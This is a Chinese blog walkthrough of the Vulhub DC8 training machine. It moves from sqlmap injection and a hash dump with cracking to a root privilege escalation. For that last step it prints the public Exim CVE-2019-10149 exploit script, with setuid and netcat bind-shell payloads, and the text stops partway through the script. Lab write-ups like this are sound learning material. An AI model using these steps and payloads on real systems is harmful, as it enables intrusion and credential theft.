<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Vulhub DC8 靶场 | w8nn9z Blog</title>
<meta name="keywords" content="">
<meta name="description" content="Vulhub DC8 靶场 - w8nn9z Blog">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/posts/penetration/vulhubdc8/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="sha256-EqVinQvl&#43;IX9lG13JX5V90An7So1FEop4tsT&#43;PYrXzU=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/penetration/vulhubdc8/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/search" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/posts" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Vulhub DC8 靶场
    </h1>
    <div class="post-meta"><span title='2025-09-29 00:00:00 +0000 UTC'>September 29, 2025</span>

</div>
  </header> 

  <div class="post-content"><p>nmap扫描开放端口及服务：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap 61.139.2.0/24
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 61.139.2.138
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00091s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp open  ssh
</span></span><span style="display:flex;"><span>80/tcp open  http
</span></span></code></pre></div><p>访问web服务：</p>
<p><img alt="alt" loading="lazy" src="/images/Vulhub/8.png"></p>
<p>存在sql注入，注入点为nid，使用sqlmap：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u http://61.139.2.138/?nid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>GET parameter <span style="color:#e6db74">&#39;nid&#39;</span> is vulnerable.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ sqlmap -u http://61.139.2.138/?nid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> --current-db
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>14:07:43<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching current database
</span></span><span style="display:flex;"><span>current database: <span style="color:#e6db74">&#39;d7db&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ sqlmap -u http://61.139.2.138/?nid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -D d7db --tables
</span></span><span style="display:flex;"><span>Database: d7db
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">88</span> tables<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>+-----------------------------+
</span></span><span style="display:flex;"><span>| block                       |
</span></span><span style="display:flex;"><span>| cache                       |
</span></span><span style="display:flex;"><span>| filter                      |
</span></span><span style="display:flex;"><span>| history                     |
</span></span><span style="display:flex;"><span>| role                        |
</span></span><span style="display:flex;"><span>| system                      |
</span></span><span style="display:flex;"><span>| actions                     |
</span></span><span style="display:flex;"><span>| authmap                     |
</span></span><span style="display:flex;"><span>| batch                       |
</span></span><span style="display:flex;"><span>| block_custom                |
</span></span><span style="display:flex;"><span>| block_node_type             |
</span></span><span style="display:flex;"><span>| block_role                  |
</span></span><span style="display:flex;"><span>| blocked_ips                 |
</span></span><span style="display:flex;"><span>| cache_block                 |
</span></span><span style="display:flex;"><span>| cache_bootstrap             |
</span></span><span style="display:flex;"><span>| cache_field                 |
</span></span><span style="display:flex;"><span>| cache_filter                |
</span></span><span style="display:flex;"><span>| cache_form                  |
</span></span><span style="display:flex;"><span>| cache_image                 |
</span></span><span style="display:flex;"><span>| cache_menu                  |
</span></span><span style="display:flex;"><span>| cache_page                  |
</span></span><span style="display:flex;"><span>| cache_path                  |
</span></span><span style="display:flex;"><span>| cache_views                 |
</span></span><span style="display:flex;"><span>| cache_views_data            |
</span></span><span style="display:flex;"><span>| ckeditor_input_format       |
</span></span><span style="display:flex;"><span>| ckeditor_settings           |
</span></span><span style="display:flex;"><span>| ctools_css_cache            |
</span></span><span style="display:flex;"><span>| ctools_object_cache         |
</span></span><span style="display:flex;"><span>| date_format_locale          |
</span></span><span style="display:flex;"><span>| date_format_type            |
</span></span><span style="display:flex;"><span>| date_formats                |
</span></span><span style="display:flex;"><span>| field_config                |
</span></span><span style="display:flex;"><span>| field_config_instance       |
</span></span><span style="display:flex;"><span>| field_data_body             |
</span></span><span style="display:flex;"><span>| field_data_field_image      |
</span></span><span style="display:flex;"><span>| field_data_field_tags       |
</span></span><span style="display:flex;"><span>| field_revision_body         |
</span></span><span style="display:flex;"><span>| field_revision_field_image  |
</span></span><span style="display:flex;"><span>| field_revision_field_tags   |
</span></span><span style="display:flex;"><span>| file_managed                |
</span></span><span style="display:flex;"><span>| file_usage                  |
</span></span><span style="display:flex;"><span>| filter_format               |
</span></span><span style="display:flex;"><span>| flood                       |
</span></span><span style="display:flex;"><span>| image_effects               |
</span></span><span style="display:flex;"><span>| image_styles                |
</span></span><span style="display:flex;"><span>| menu_custom                 |
</span></span><span style="display:flex;"><span>| menu_links                  |
</span></span><span style="display:flex;"><span>| menu_router                 |
</span></span><span style="display:flex;"><span>| node                        |
</span></span><span style="display:flex;"><span>| node_access                 |
</span></span><span style="display:flex;"><span>| node_revision               |
</span></span><span style="display:flex;"><span>| node_type                   |
</span></span><span style="display:flex;"><span>| queue                       |
</span></span><span style="display:flex;"><span>| rdf_mapping                 |
</span></span><span style="display:flex;"><span>| registry                    |
</span></span><span style="display:flex;"><span>| registry_file               |
</span></span><span style="display:flex;"><span>| role_permission             |
</span></span><span style="display:flex;"><span>| search_dataset              |
</span></span><span style="display:flex;"><span>| search_index                |
</span></span><span style="display:flex;"><span>| search_node_links           |
</span></span><span style="display:flex;"><span>| search_total                |
</span></span><span style="display:flex;"><span>| semaphore                   |
</span></span><span style="display:flex;"><span>| sequences                   |
</span></span><span style="display:flex;"><span>| sessions                    |
</span></span><span style="display:flex;"><span>| shortcut_set                |
</span></span><span style="display:flex;"><span>| shortcut_set_users          |
</span></span><span style="display:flex;"><span>| site_messages_table         |
</span></span><span style="display:flex;"><span>| taxonomy_index              |
</span></span><span style="display:flex;"><span>| taxonomy_term_data          |
</span></span><span style="display:flex;"><span>| taxonomy_term_hierarchy     |
</span></span><span style="display:flex;"><span>| taxonomy_vocabulary         |
</span></span><span style="display:flex;"><span>| url_alias                   |
</span></span><span style="display:flex;"><span>| users                       |
</span></span><span style="display:flex;"><span>| users_roles                 |
</span></span><span style="display:flex;"><span>| variable                    |
</span></span><span style="display:flex;"><span>| views_display               |
</span></span><span style="display:flex;"><span>| views_view                  |
</span></span><span style="display:flex;"><span>| watchdog                    |
</span></span><span style="display:flex;"><span>| webform                     |
</span></span><span style="display:flex;"><span>| webform_component           |
</span></span><span style="display:flex;"><span>| webform_conditional         |
</span></span><span style="display:flex;"><span>| webform_conditional_actions |
</span></span><span style="display:flex;"><span>| webform_conditional_rules   |
</span></span><span style="display:flex;"><span>| webform_emails              |
</span></span><span style="display:flex;"><span>| webform_last_download       |
</span></span><span style="display:flex;"><span>| webform_roles               |
</span></span><span style="display:flex;"><span>| webform_submissions         |
</span></span><span style="display:flex;"><span>| webform_submitted_data      |
</span></span><span style="display:flex;"><span>+-----------------------------+
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ sqlmap -u http://61.139.2.138/?nid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -D d7db -T users --columns
</span></span><span style="display:flex;"><span>Database: d7db
</span></span><span style="display:flex;"><span>Table: users
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">16</span> columns<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>+------------------+------------------+
</span></span><span style="display:flex;"><span>| Column           | Type             |
</span></span><span style="display:flex;"><span>+------------------+------------------+
</span></span><span style="display:flex;"><span>| data             | longblob         |
</span></span><span style="display:flex;"><span>| language         | varchar<span style="color:#f92672">(</span>12<span style="color:#f92672">)</span>      |
</span></span><span style="display:flex;"><span>| name             | varchar<span style="color:#f92672">(</span>60<span style="color:#f92672">)</span>      |
</span></span><span style="display:flex;"><span>| status           | tinyint<span style="color:#f92672">(</span>4<span style="color:#f92672">)</span>       |
</span></span><span style="display:flex;"><span>| access           | int<span style="color:#f92672">(</span>11<span style="color:#f92672">)</span>          |
</span></span><span style="display:flex;"><span>| created          | int<span style="color:#f92672">(</span>11<span style="color:#f92672">)</span>          |
</span></span><span style="display:flex;"><span>| init             | varchar<span style="color:#f92672">(</span>254<span style="color:#f92672">)</span>     |
</span></span><span style="display:flex;"><span>| login            | int<span style="color:#f92672">(</span>11<span style="color:#f92672">)</span>          |
</span></span><span style="display:flex;"><span>| mail             | varchar<span style="color:#f92672">(</span>254<span style="color:#f92672">)</span>     |
</span></span><span style="display:flex;"><span>| pass             | varchar<span style="color:#f92672">(</span>128<span style="color:#f92672">)</span>     |
</span></span><span style="display:flex;"><span>| picture          | int<span style="color:#f92672">(</span>11<span style="color:#f92672">)</span>          |
</span></span><span style="display:flex;"><span>| signature        | varchar<span style="color:#f92672">(</span>255<span style="color:#f92672">)</span>     |
</span></span><span style="display:flex;"><span>| signature_format | varchar<span style="color:#f92672">(</span>255<span style="color:#f92672">)</span>     |
</span></span><span style="display:flex;"><span>| theme            | varchar<span style="color:#f92672">(</span>255<span style="color:#f92672">)</span>     |
</span></span><span style="display:flex;"><span>| timezone         | varchar<span style="color:#f92672">(</span>32<span style="color:#f92672">)</span>      |
</span></span><span style="display:flex;"><span>| uid              | int<span style="color:#f92672">(</span>10<span style="color:#f92672">)</span> unsigned |
</span></span><span style="display:flex;"><span>+------------------+------------------+
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ sqlmap -u http://61.139.2.138/?nid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -D d7db -T users -C name,pass --dump
</span></span><span style="display:flex;"><span>Database: d7db
</span></span><span style="display:flex;"><span>Table: users
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">2</span> entries<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>+--------+---------------------------------------------------------+
</span></span><span style="display:flex;"><span>| name   | pass                                                    |
</span></span><span style="display:flex;"><span>+--------+---------------------------------------------------------+
</span></span><span style="display:flex;"><span>| admin  | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
</span></span><span style="display:flex;"><span>| john   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
</span></span><span style="display:flex;"><span>+--------+---------------------------------------------------------+
</span></span></code></pre></div><p>写入hash：</p>
<pre tabindex="0"><code>admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
</code></pre><p>只爆出了john的密码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ john hash
</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">2</span> password hashes with <span style="color:#ae81ff">2</span> different salts <span style="color:#f92672">(</span>Drupal7, $S$ <span style="color:#f92672">[</span>SHA512 512/512 AVX512BW 8x<span style="color:#f92672">])</span>
</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">32768</span> <span style="color:#66d9ef">for</span> all loaded hashes
</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
</span></span><span style="display:flex;"><span>Proceeding with single, rules:Single
</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
</span></span><span style="display:flex;"><span>Warning: Only <span style="color:#ae81ff">10</span> candidates buffered <span style="color:#66d9ef">for</span> the current salt, minimum <span style="color:#ae81ff">32</span> needed <span style="color:#66d9ef">for</span> performance.
</span></span><span style="display:flex;"><span>Almost <span style="color:#66d9ef">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#66d9ef">if</span> any.
</span></span><span style="display:flex;"><span>Proceeding with wordlist:/usr/share/john/password.lst
</span></span><span style="display:flex;"><span>turtle           <span style="color:#f92672">(</span>john<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>dirsearch扫出登录页面：</p>
<pre tabindex="0"><code>[13:59:09] 200 -    2KB - /user/                                            
[13:59:09] 200 -    2KB - /user/login/
</code></pre><p><code>contact us</code>中可以传马，不能是纯php代码，否则会返回原来的文本信息：</p>
<p><img alt="alt" loading="lazy" src="/images/Vulhub/9.png"></p>
<p>尝试suid提权：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>www-data:/<span style="color:#f92672">)</span> $ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/bin/chfn
</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
</span></span><span style="display:flex;"><span>/usr/bin/chsh
</span></span><span style="display:flex;"><span>/usr/bin/passwd
</span></span><span style="display:flex;"><span>/usr/bin/sudo
</span></span><span style="display:flex;"><span>/usr/bin/newgrp
</span></span><span style="display:flex;"><span>/usr/sbin/exim4
</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style="display:flex;"><span>/bin/ping
</span></span><span style="display:flex;"><span>/bin/su
</span></span><span style="display:flex;"><span>/bin/umount
</span></span><span style="display:flex;"><span>/bin/mount
</span></span></code></pre></div><p>exim4提权，先查看版本：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>www-data:/<span style="color:#f92672">)</span> $ /usr/sbin/exim4 --version
</span></span><span style="display:flex;"><span>Exim version 4.89 <span style="color:#75715e">#2 built 14-Jun-2017 05:03:07</span>
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> University of Cambridge, <span style="color:#ae81ff">1995</span> - <span style="color:#ae81ff">2017</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, <span style="color:#ae81ff">2007</span> - <span style="color:#ae81ff">2017</span>
</span></span><span style="display:flex;"><span>Berkeley DB: Berkeley DB 5.3.28: <span style="color:#f92672">(</span>September  9, 2013<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Support <span style="color:#66d9ef">for</span>: crypteq iconv<span style="color:#f92672">()</span> IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open
</span></span><span style="display:flex;"><span>Lookups <span style="color:#f92672">(</span>built-in<span style="color:#f92672">)</span>: lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd
</span></span><span style="display:flex;"><span>Authenticators: cram_md5 plaintext
</span></span><span style="display:flex;"><span>Routers: accept dnslookup ipliteral manualroute queryprogram redirect
</span></span><span style="display:flex;"><span>Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp
</span></span><span style="display:flex;"><span>Fixed never_users: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Configure owner: 0:0
</span></span><span style="display:flex;"><span>Size of off_t: <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>Configuration file is /var/lib/exim4/config.autogenerated
</span></span></code></pre></div><p>searchsploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ searchsploit Exim <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>Exim 4.87 - 4.91 - Local Privilege Escalation                                                                                                     | linux/local/46996.sh
</span></span></code></pre></div><p>查看如何使用该脚本：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># raptor_exim_wiz - &#34;The Return of the WIZard&#34; LPE exploit</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># A flaw was found in Exim versions 4.87 to 4.91 (inclusive).</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Improper validation of recipient address in deliver_message()</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># function in /src/deliver.c may lead to remote command execution.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (CVE-2019-10149)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is a local privilege escalation exploit for &#34;The Return</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># of the WIZard&#34; vulnerability reported by the Qualys Security</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Advisory team.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Credits:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Qualys Security Advisory team (kudos for your amazing research!)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dennis &#39;dhn&#39; Herrmann (/dev/tcp technique)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Usage (setuid method):</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ id</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ ./raptor_exim_wiz -m setuid</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Preparing setuid shell helper...</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Delivering setuid payload...</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># [...]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Waiting 5 seconds...</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># # id</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># uid=0(root) gid=0(root) groups=0(root)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Usage (netcat method):</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ id</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ ./raptor_exim_wiz -m netcat</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Delivering netcat payload...</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Waiting 5 seconds...</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># localhost [127.0.0.1] 31337 (?) open</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># id</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># uid=0(root) gid=0(root) groups=0(root)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vulnerable platforms:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exim 4.87 - 4.91</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tested against:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exim 4.89 on Debian GNU/Linux 9 (stretch) [exim-4.89.tar.xz]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>METHOD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;setuid&#34;</span> <span style="color:#75715e"># default method</span>
</span></span><span style="display:flex;"><span>PAYLOAD_SETUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22}}@localhost&#39;</span>
</span></span><span style="display:flex;"><span>PAYLOAD_NETCAT<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31337\t-e\t\x2fbin\x2fsh\x22}}@localhost&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># usage instructions</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> usage<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$0<span style="color:#e6db74"> [-m METHOD]&#34;</span>
</span></span><span style="display:flex;"><span>        echo
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;-m setuid : use the setuid payload (default)&#34;</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;-m netcat : use the netcat payload&#34;</span>
</span></span><span style="display:flex;"><span>        echo
</span></span><span style="display:flex;"><span>        exit <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload delivery</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> exploit<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># connect to localhost:25</span>
</span></span><span style="display:flex;"><span>        exec 3&lt;&gt;/dev/tcp/localhost/25
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># deliver the payload</span>
</span></span><span style="display:flex;"><span>        read -u <span style="color:#ae81ff">3</span> <span style="color:#f92672">&amp;&amp;</span> echo $REPLY
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;helo localhost&#34;</span> &gt;&amp;<span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>        read -u <span style="color:#ae81ff">3</span> <span style="color:#f92672">&amp;&amp;</span> echo $REPLY
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;mail from:&lt;&gt;&#34;</span> &gt;&amp;<span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>        read -u <span style="color:#ae81ff">3</span> <span style="color:#f92672">&amp;&amp;</span> echo $REPLY
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;rcpt to:&lt;</span>$PAYLOAD<span style="color:#e6db74">&gt;&#34;</span> &gt;&amp;<span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>        read -u <span style="color:#ae81ff">3</span> <span style="color:#f92672">&amp;&amp;</span> echo $REPLY
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;data&#34;</span> &gt;&amp;<span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>        read -u <span style="color:#ae81ff">3</span> <span style="color:#f92672">&amp;&amp;</span> echo $REPLY
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..31<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>                echo <span style="color:#e6db74">&#34;Received: </span>$i<span style="color:#e6db74">&#34;</span> &gt;&amp;<span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;.&#34;</span> &gt;&amp;<span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>        read -u <span style="color:#ae81ff">3</span> <span style="color:#f92672">&amp;&amp;</span> echo $REPLY
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;quit&#34;</span> &gt;&amp;<span style="color:#ae81ff">3</span>
